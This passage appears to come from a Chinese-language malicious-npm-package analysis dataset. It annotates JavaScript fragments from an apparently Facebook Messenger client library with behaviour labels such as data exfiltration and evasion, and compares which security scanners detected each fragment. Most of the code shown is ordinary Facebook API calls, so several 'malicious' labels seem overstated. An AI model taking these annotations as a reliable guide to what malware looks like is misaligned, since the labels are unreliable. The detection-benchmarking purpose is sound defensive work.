    if (!callback && (utils.getType(form) == "Function" || utils.getType(form) == "AsyncFunction")) {
      callback = form;
      form = {};
    }

    form = form || {};
    
    
    callback = callback || function(err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
    };

    defaultFuncs
      .postFormData(url, ctx.jar, form)
      .then(function(resData) {
        callback(null, resData.body.toString());
      })
      .catch(function(err) {
        log.error("httpPostFormData", err);
        return callback(err);
      });

    return returnPromise;
  };
};
```

**形式化行为：** data_exfiltration, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 10

**文件：** `package/getAccessToken.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Dynamically loads external module and executes function with sensitive context, enabling hidden code execution or data exfiltration.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function getAccessToken(callback) {
      var resolveFunc = function () { };
      var rejectFunc = function () { };
      var returnPromise = new Promise(function (resolve, reject) {
        resolveFunc = resolve;
        rejectFunc = reject;
      });
  
      if (!callback) {
        callback = function (err, userInfo) {
          if (err) return rejectFunc(err);
          resolveFunc(userInfo);
        };
      }
    try {
      var { getAccessToken } = require('../Extra/ExtraAddons');
      getAccessToken(ctx.jar,ctx,defaultFuncs).then(data => callback(null,data));
    }
    catch (e) {
      callback(null, e);
    }
    return returnPromise;
    };
  };
```

**形式化行为：** dynamic_evaluation, unauthorized_access

**形式化规避：** code_splitting, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 11

**文件：** `package/httpPost.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST requests and processes responses, potentially transmitting data to arbitrary URLs.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function httpGet(url, form, callback, notAPI) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };

    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback && (utils.getType(form) == "Function" || utils.getType(form) == "AsyncFunction")) {
      callback = form;
      form = {};
    }

    form = form || {};

    callback = callback || function (err, data) {
      if (err) return rejectFunc(err);
      resolveFunc(data);
    };

    if (notAPI) {
      utils
        .post(url, ctx.jar, form, ctx.globalOptions)
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpPost", err);
          return callback(err);
        });
    }
    else {
      defaultFuncs
        .post(url, ctx.jar, form, {})
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpPost", err);
          return callback(err);
        });
    }
    return returnPromise;
  };
};

```

**形式化行为：** data_exfiltration, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 12

**文件：** `package/getUID.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Loads external module, processes URLs, and sends messages using global event data; possible data exfiltration risk.

**规避技术：** 

**恶意代码：**
```javascript
module.exports = function (_defaultFuncs, api, _ctx) {
    return function getUID(link, callback) {
      var resolveFunc = function () { };
      var rejectFunc = function () { };
      var returnPromise = new Promise(function (resolve, reject) {
        resolveFunc = resolve;
        rejectFunc = reject;
      });
  
      if (!callback) {
        callback = function (err, uid) {
          if (err) return rejectFunc(err);
          resolveFunc(uid);
        };
      }
      
    try {
        var Link = String(link);
        var FindUID = require('../Extra/ExtraFindUID');
        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {
            var LinkSplit = Link.split('/');
            if (LinkSplit.indexOf("https:") == 0) {
              if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {
                api.sendMessage('Sai Link, Link Cần Có Định Dạng Như Sau: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
                callback(null, String(4));
              }
              else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {
                var Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;
                FindUID(Format,api).then(function (data) {
                  callback(null, data);
                });
              } 
              else {
                FindUID(Link,api).then(function (data) {
                  callback(null, data);
                });
              }
            }
            else {
                var Form = `https://www.facebook.com/${LinkSplit[1]}`;
                FindUID(Form,api).then(function (data) {
                    callback(null, data);
                });
            }
        }
        else {
            callback(null, null);
            api.sendMessage('Sai Link, Link Cần Là Link Của Facebook',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID)
        }
    }
    catch (e) {
      return callback(null, e);
    }
    return returnPromise;
    };
  };
```

**形式化行为：** legitimate_api_abuse, sensitive_data_collection

**形式化规避：** silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 13

**文件：** `package/getUserInfoV5.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook GraphQL API, potentially exfiltrating user data; network activity with user-supplied input.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");


module.exports = function(defaultFuncs, api, ctx) {

  return function getUserInfoV5GraphQL(id, callback) {
    var resolveFunc = function(){};
    var rejectFunc = function(){};
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
      callback = function (err, data) {
        if (err) {
          return rejectFunc(err);
        }
        resolveFunc(data);
      };
    }

    // `queries` has to be a string. I couldn't tell from the dev console. This
    // took me a really long time to figure out. I deserve a cookie for this.
    var form = {
      queries: JSON.stringify({
        o0: {
          // This doc_id is valid as of July 20th, 2020
          doc_id: "5009315269112105",
          query_params: {
            ids: [id]
          }
        }
      }),
      batch_name: "MessengerParticipantsFetcher"
    };
      defaultFuncs
      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function(resData) {
      if (resData.error) {
        throw resData;
      }
      // This returns us an array of things. The last one is the success /
      // failure one.
      // @TODO What do we do in this case?
      if (resData[resData.length - 1].error_results !== 0) {
        console.error("GetThreadInfo", "Bạn Đang Bị Ăn Get Vì Sử Dụng Quá Nhiều !");
      }
        callback(null, resData);
    })
    .catch(function(err) {
      log.error("getThreadInfoGraphQL", "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều, Hãy Thử Lại !");
    return callback(err);
  });
    return returnPromise;
    }
};
```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 14

**文件：** `package/markAsDelivered.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests to Facebook, potentially transmitting user data and cookies to an external server.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function markAsDelivered(threadID, messageID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    if (!threadID || !messageID) return callback("Error: messageID or threadID is not defined");

    var form = {};

    form["message_ids[0]"] = messageID;
    form["thread_ids[" + threadID + "][0]"] = messageID;

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/delivery_receipts.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("markAsDelivered", err);
        if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;

        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 15

**文件：** `package/getMessage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook API, collects and processes message data, including attachments and sender info.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function(defaultFuncs, api, ctx) {
    return function getMessage(threadID, messageID, callback) {
      if (!callback) {
        return callback({ error: "getMessage: need callback" });
      }

      if (!threadID || !messageID) {
        return callback({ error: "getMessage: need threadID and messageID" });
      }

      const form = {
        "av": ctx.globalOptions.pageID,
        "queries": JSON.stringify({
          "o0": {
            //This doc_id is valid as of ? (prob January 18, 2020)
            "doc_id": "1768656253222505",
            "query_params": {
              "thread_and_message_id": {
                "thread_id": threadID,
                "message_id": messageID,
              }
            }
          }
        })
      };

      defaultFuncs
      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then((resData) => {
        if (resData[resData.length - 1].error_results > 0) {
          throw resData[0].o0.errors;
        }

        if (resData[resData.length - 1].successful_results === 0) {
          throw { error: "getMessage: there was no successful_results", res: resData };
        }

        var fetchData = resData[0].o0.data.message;
        if (fetchData) {
          (!ctx.globalOptions.selfListen &&
            fetchData.message_sender.id.toString() === ctx.userID) ||
            !ctx.loggedIn ?
            undefined :
            (function () { callback(null, {
                threadID: threadID,
                messageID: fetchData.message_id,
                senderID: fetchData.message_sender.id,
                attachments: fetchData.blob_attachments.map(att => {
                    var x;
                    try {
                        x = utils._formatAttachment(att);
                    } catch (ex) {
                        x = att;
                        x.error = ex;
                        x.type = "unknown";
                    }
                    return x;
                }),
                body: fetchData.message.text,
                mentions: fetchData.message.ranges,
                timestamp: fetchData.timestamp_precise,
                messageReply: fetchData.replied_to_message,
                raw: fetchData,
            }); })();
        }
    })
    .catch((err) => {
      log.error("getMessage", err);
      callback(err);
    });

  };
};
```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 16

**文件：** `package/markAsRead.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST and MQTT publish, potentially sending data to Facebook and via MQTT; could be abused for data exfiltration.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return async function markAsRead(threadID, read, callback) {
    if (utils.getType(read) === 'Function' || utils.getType(read) === 'AsyncFunction') {
      callback = read;
      read = true;
    }
    if (read == undefined) read = true;

    if (!callback) callback = () => { };

    var form = {};

    if (typeof ctx.globalOptions.pageID !== 'undefined') {
      form["source"] = "PagesManagerMessagesInterface";
      form["request_user_id"] = ctx.globalOptions.pageID;
      form["ids[" + threadID + "]"] = read;
      form["watermarkTimestamp"] = new Date().getTime();
      form["shouldSendReadReceipt"] = true;
      form["commerce_last_message_type"] = "";
      //form["titanOriginatedThreadId"] = utils.generateThreadingID(ctx.clientID);

      let resData;
      try {
        resData = await (
          defaultFuncs
            .post("https://www.facebook.com/ajax/mercury/change_read_status.php", ctx.jar, form)
            .then(utils.saveCookies(ctx.jar))
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        );
      }
      catch (e) {
        callback(e);
        return e;
      }

      if (resData.error) {
        let err = resData.error;
        log.error("markAsRead", err);
        if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;
        callback(err);
        return err;
      }

      callback();
      return null;
    }
    else {
      try {
        if (ctx.mqttClient) {
          let err = await new Promise(r => ctx.mqttClient.publish("/mark_thread", JSON.stringify({
            threadID,
            mark: "read",
            state: read
          }), { qos: 1, retain: false }, r));
          if (err) throw err;
        }
        else throw { error: "You can only use this function after you start listening." };
      }
      catch (e) {
        callback(e);
        return e;
      }
    }
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 17

**文件：** `package/createNewGroup.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests to Facebook GraphQL API, potentially transmitting user and group data over the network.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function createNewGroup(participantIDs, groupTitle, callback) {
    if (utils.getType(groupTitle) == "Function") {
      callback = groupTitle;
      groupTitle = null;
    }

    if (utils.getType(participantIDs) !== "Array") throw { error: "createNewGroup: participantIDs should be an array." };

    if (participantIDs.length < 2) throw { error: "createNewGroup: participantIDs should have at least 2 IDs." };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, threadID) {
        if (err) return rejectFunc(err);
        resolveFunc(threadID);
      };
    }

    var pids = [];
    for (var n in participantIDs) pids.push({ fbid: participantIDs[n] });
    pids.push({ fbid: ctx.userID });

    var form = {
      fb_api_caller_class: "RelayModern",
      fb_api_req_friendly_name: "MessengerGroupCreateMutation",
      av: ctx.userID,
      //This doc_id is valid as of January 11th, 2020
      doc_id: "577041672419534",
      variables: JSON.stringify({
        input: {
          entry_point: "jewel_new_group",
          actor_id: ctx.userID,
          participants: pids,
          client_mutation_id: Math.round(Math.random() * 1024).toString(),
          thread_settings: {
            name: groupTitle,
            joinable_mode: "PRIVATE",
            thread_image_fbid: null
          }
        }
      })
    };

    defaultFuncs
      .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.errors) throw resData;
        return callback(null, resData.data.messenger_group_thread_create.thread.thread_key.thread_fbid);
      })
      .catch(function (err) {
        log.error("createNewGroup", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 18

**文件：** `package/getUserInfoV3.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends user-supplied data to Facebook GraphQL API and processes response, potentially exposing user info or automating data scraping.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function getUserInfoV3(id,full, callback) {
        if (utils.getType(full) !== "Boolean") {
            throw {error: "getUserInfoV3: full must be a boolean"};
        }
        var resolveFunc = function () { };
        var rejectFunc = function () { };
        var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });
    
        if (!callback) {
            callback = function (err, userInfo) {
            if (err) return rejectFunc(err);
            resolveFunc(userInfo);
            };
        }

var form = {
    "av": ctx.userID,
    "fb_api_caller_class": "RelayModern",
    "fb_api_req_friendly_name": "ProfileCometTimelineFeedRefetchQuery",
    "variables": JSON.stringify({ 
        "id": String(id) 
    }),
    "doc_id": 5092283120862795
}
try {
        defaultFuncs
            .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
            .then(function (resData) {
            if (resData.error) throw resData;
                switch (full) {
                    case true:
                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node);
                        break;
                    case false:
                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node.comet_sections.context_layout.story.comet_sections.actor_photo.story.actors[0]);
                        break;
                    default: 
                throw {error: "getUserInfoV3: full must be a boolean"};
                }
            })
            .catch(function (err) {
                log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
                return callback(err);
            });
    }
    catch (e) {
        return callback(null, e);
    }
    return returnPromise;
    };
};
```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 19

**文件：** `package/setPostReaction.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests to Facebook GraphQL API, potentially automating user actions or collecting user data.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function(defaultFuncs, api, ctx) {
  return function setPostReaction(postID, type, callback) {
    var resolveFunc = function(){};
    var rejectFunc = function(){};
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      if (utils.getType(type) === "Function" || utils.getType(type) === "AsyncFunction") {
        callback = type;
        type = 0;
      }
      else {
        callback = function (err, data) {
          if (err) {
            return rejectFunc(err);
          }
          resolveFunc(data);
        };
      }
    }

    var map = {
      unlike: 0,
      like: 1,
      heart: 2,
      love: 16,
      haha: 4,
      wow: 3,
      sad: 7,
      angry: 8
    };
    
    if (utils.getType(type) !== "Number" && utils.getType(type) === "String") {
      type = map[type.toLowerCase()];
    }
    else {
      throw {
        error: "setPostReaction: Invalid reaction type"
      };
    }
    
    var form = {
      av: ctx.userID,
      fb_api_caller_class: "RelayModern",
      fb_api_req_friendly_name: "CometUFIFeedbackReactMutation",
      doc_id: "4769042373179384",
      variables: JSON.stringify({
        input: {
          actor_id: ctx.userID,
          feedback_id: (new Buffer.from("feedback:" + postID)).toString("base64"),
          feedback_reaction: type,
          feedback_source: "OBJECT",
          is_tracking_encrypted: true,
          tracking: [],
          session_id: "f7dd50dd-db6e-4598-8cd9-561d5002b423",
          client_mutation_id: Math.round(Math.random() * 19).toString()
        },
        useDefaultActor: false,
        scale: 3
      })
    };

    defaultFuncs
      .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function(resData) {
        if (resData.errors) {
          throw resData;
        }
        return callback(null, formatData(resData.data));
      })
      .catch(function(err) {
        log.error("setPostReaction", err);
        return callback(err);
      });

    return returnPromise;
  };
};
```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 20

**文件：** `package/getThreadList.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook GraphQL API, processes and formats thread data, may expose user data if misused.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

const utils = require("../utils");
const log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function getThreadList(limit, timestamp, tags, callback) {
    if (!callback && (utils.getType(tags) === "Function" || utils.getType(tags) === "AsyncFunction")) {
      callback = tags;
      tags = [""];
    }
    if (utils.getType(limit) !== "Number" || !Number.isInteger(limit) || limit <= 0) throw { error: "getThreadList: limit must be a positive integer" };

    if (utils.getType(timestamp) !== "Null" && (utils.getType(timestamp) !== "Number" || !Number.isInteger(timestamp))) throw { error: "getThreadList: timestamp must be an integer or null" };

    if (utils.getType(tags) === "String") tags = [tags];
    if (utils.getType(tags) !== "Array") throw { error: "getThreadList: tags must be an array" };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (utils.getType(callback) !== "Function" && utils.getType(callback) !== "AsyncFunction") {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    const form = {
      "av": ctx.globalOptions.pageID,
      "queries": JSON.stringify({
        "o0": {
          // This doc_id was valid on 2020-07-20
          "doc_id": "3336396659757871",
          "query_params": {
            "limit": limit + (timestamp ? 1 : 0),
            "before": timestamp,
            "tags": tags,
            "includeDeliveryReceipts": true,
            "includeSeqID": false
          }
        }
      }),
      "batch_name": "MessengerGraphQLThreadlistFetcher"
    };

    defaultFuncs
      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then((resData) => {
        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;

        if (resData[resData.length - 1].successful_results === 0) throw { error: "getThreadList: there was no successful_results", res: resData };

        // When we ask for threads using timestamp from the previous request,
        // we are getting the last thread repeated as the first thread in this response.
        // .shift() gets rid of it
        // It is also the reason for increasing limit by 1 when timestamp is set
        // this way user asks for 10 threads, we are asking for 11,
        // but after removing the duplicated one, it is again 10
        if (timestamp) resData[0].o0.data.viewer.message_threads.nodes.shift();

        callback(null, formatThreadList(resData[0].o0.data.viewer.message_threads.nodes));
      })
      .catch((err) => {
        log.error("getThreadList", "Lỗi: getThreadList Có Thể Do Bạn Spam Quá Nhiều, Hãy Thử Lại !");
        return callback(err);
      });

    return returnPromise;
  };
};

// ... [truncated for brevity] ...

function formatThreadList(data) {
  return data.map(t => {
    let lastMessageNode = (t.last_message && t.last_message.nodes && t.last_message.nodes.length > 0) ? t.last_message.nodes[0] : null;
    return {
      threadID: t.thread_key ? utils.formatID(t.thread_key.thread_fbid || t.thread_key.other_user_id) : null, // shall never be null
      name: getThreadName(t),
      unreadCount: t.unread_count,
      messageCount: t.messages_count,
      imageSrc: t.image ? t.image.uri : null,
      emoji: t.customization_info ? t.customization_info.emoji : null,
      color: formatColor(t.customization_info ? t.customization_info.outgoing_bubble_color : null),
      nicknames: mapNicknames(t.customization_info),
      muteUntil: t.mute_until,
      participants: formatParticipants(t.all_participants),
      adminIDs: t.thread_admins.map(a => a.id),
      folder: t.folder,
      isGroup: t.thread_type === "GROUP",
      customizationEnabled: t.customization_enabled, // false for ONE_TO_ONE with Page or ReducedMessagingActor
      participantAddMode: t.participant_add_mode_as_string, // "ADD" if "GROUP" and null if "ONE_TO_ONE"
      montageThread: t.montage_thread ? Buffer.from(t.montage_thread.id, "base64").toString() : null, // base64 encoded string "message_thread:0000000000000000"
      reactionsMuteMode: t.reactions_mute_mode,
      mentionsMuteMode: t.mentions_mute_mode,
      isArchived: t.has_viewer_archived,
      isSubscribed: t.is_viewer_subscribed,
      timestamp: t.updated_time_precise, // in miliseconds
      snippet: lastMessageNode ? lastMessageNode.snippet : null,
      snippetAttachments: lastMessageNode ? lastMessageNode.extensible_attachment : null, // TODO: not sure if it works
      snippetSender: lastMessageNode ? utils.formatID((lastMessageNode.message_sender.messaging_actor.id || "").toString()) : null,
      lastMessageTimestamp: lastMessageNode ? lastMessageNode.timestamp_precise : null, // timestamp in miliseconds
      lastReadTimestamp: (t.last_read_receipt && t.last_read_receipt.nodes.length > 0)
        ? (t.last_read_receipt.nodes[0] ? t.last_read_receipt.nodes[0].timestamp_precise : null)
        : null, // timestamp in miliseconds
      cannotReplyReason: t.cannot_reply_reason, // TODO: inspect possible values
      approvalMode: Boolean(t.approval_mode),
      participantIDs: formatParticipants(t.all_participants).map(participant => participant.userID),
      threadType: t.thread_type === "GROUP" ? 2 : 1 // "GROUP" or "ONE_TO_ONE"
    };
  });
}

```

**形式化行为：** legitimate_api_abuse, sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 21

**文件：** `package/httpGet.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP GET requests and returns response data; could be used for data exfiltration or unauthorized network access.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function httpGet(url, form, callback, notAPI) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };

    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback && (utils.getType(form) == "Function" || utils.getType(form) == "AsyncFunction")) {
      callback = form;
      form = {};
    }

    form = form || {};

    callback = callback || function (err, data) {
      if (err) return rejectFunc(err);
      resolveFunc(data);
    };

    if (notAPI) {
      utils
        .get(url, ctx.jar, form, ctx.globalOptions)
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpGet", err);
          return callback(err);
        });
    }
    else {
      defaultFuncs
        .get(url, ctx.jar, form)
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpGet", err);
          return callback(err);
        });
    }

    return returnPromise;
  };
};

```

**形式化行为：** data_exfiltration, unauthorized_access

**形式化规避：** built_in_module_abuse, silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 22

**文件：** `package/Premium.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Dynamically loads and executes external JS files based on user input; potential for arbitrary code execution.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var { join } = require('path')
var fs = require('fs')


module.exports = function (defaultFuncs, api, ctx) {
    return function(Name, args){
        var Method = {}
        fs.readdirSync(join(__dirname, "../Func")).filter((/** @type {string} */File) => File.endsWith(".js") && !File.includes('Dev_')).map((/** @type {string} */File) => Method[File.split('.').slice(0, -1).join('.')] = require(`../Func/${File}`)(defaultFuncs, api, ctx));
        if (Method[Name] == undefined) {
            return (`Method ${Name} not found`);
        }
        else {
            try {
